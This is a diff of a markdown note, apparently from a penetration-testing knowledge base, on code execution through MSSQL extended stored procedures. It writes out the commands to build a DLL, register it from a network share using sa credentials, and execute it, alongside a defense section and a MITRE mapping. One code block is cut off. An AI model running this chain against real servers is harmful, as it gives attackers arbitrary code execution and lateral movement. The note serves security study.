@@ -39,11 +39,15 @@ MSSQL Server Extended Stored Procedures are routines that execute in the address
 
 To execute this attack, the attacker must have access to the MSSQL Server and be able to create and execute a malicious DLL. The attacker can use this attack to gain access to sensitive data or to pivot to other systems on the network.
 
+ 
+
 ## Requirements
 
 1. Access to the MSSQL Server
 
 1. Ability to create and execute a malicious DLL
+
+ 
 
 ## Defense
 
@@ -53,6 +57,8 @@ To execute this attack, the attacker must have access to the MSSQL Server and be
 
 1. Implement application whitelisting to prevent the execution of unauthorized DLLs
 
+ 
+
 ## Objectives
 
 1. Execute arbitrary code in the context of the SQL Server process
@@ -61,12 +67,20 @@ To execute this attack, the attacker must have access to the MSSQL Server and be
 
 1. Gain access to sensitive data or pivot to other systems on the network
 
+ 
+
 # Instructions
 
 1. This command creates a malicious DLL and executes it on a target SQL server. It first creates the DLL using the Create-SQLFileXpDll command and exports it as 'xp_test' to C:\temp\test.dll. The DLL contains a command to create a file called test.txt in the same location. The DLL is then loaded onto the target server using the sp_addextendedproc command and executed using the xp_test command.
 
+ 
+
+
+
 **Code**: [[# Create evil DLL
 Create-SQLFileXpDll -OutFile C:\]]
+
+
 
 > The Create-SQLFileXpDll command creates a DLL file that can be executed on a SQL server. The -OutFile parameter specifies the file path and name for the DLL. The -Command parameter specifies the command to be executed when the DLL is loaded. The -ExportName parameter specifies the name of the extended stored procedure that will be created from the DLL.
 
@@ -76,11 +90,17 @@ The sp_addextendedproc command adds an extended stored procedure to a SQL server
 
 The Get-SQLStoredProcedureXP command lists all the extended stored procedures on a SQL server.
 
+
+
 **Command** ([[Create evil DLL]]):
 
 ```bash
 Create-SQLFileXpDll -OutFile C:\temp\test.dll -Command "echo test > c:\temp\test.txt" -ExportName xp_test
 ```
+
+
+
+
 
 **Command** ([[Load DLL and call xp_test]]):
 
@@ -88,17 +108,27 @@ Create-SQLFileXpDll -OutFile C:\temp\test.dll -Command "echo test > c:\temp\test
 Get-SQLQuery -UserName sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Query "sp_addextendedproc 'xp_test', '\\10.10.0.1\temp\test.dll'"
 ```
 
+
+
+
+
 **Command** ([[Call xp_test]]):
 
 ```bash
 Get-SQLQuery -UserName sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Query "EXEC xp_test"
 ```
 
+
+
+
+
 **Command** ([[List existing]]):
 
 ```bash
 Get-SQLStoredProcedureXP -Instance "<DBSERVERNAME\DBInstance>" -Verbose
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -128,3 +158,5 @@ Get-SQLStoredProcedureXP -Instance "<DBSERVERNAME\DBInstance>" -Verbose
 - [[Add the extended stored procedure and list extended stored procedures]]
 - [[Extended Stored Procedure]]
 - [[MSSQL Server]]
+
+
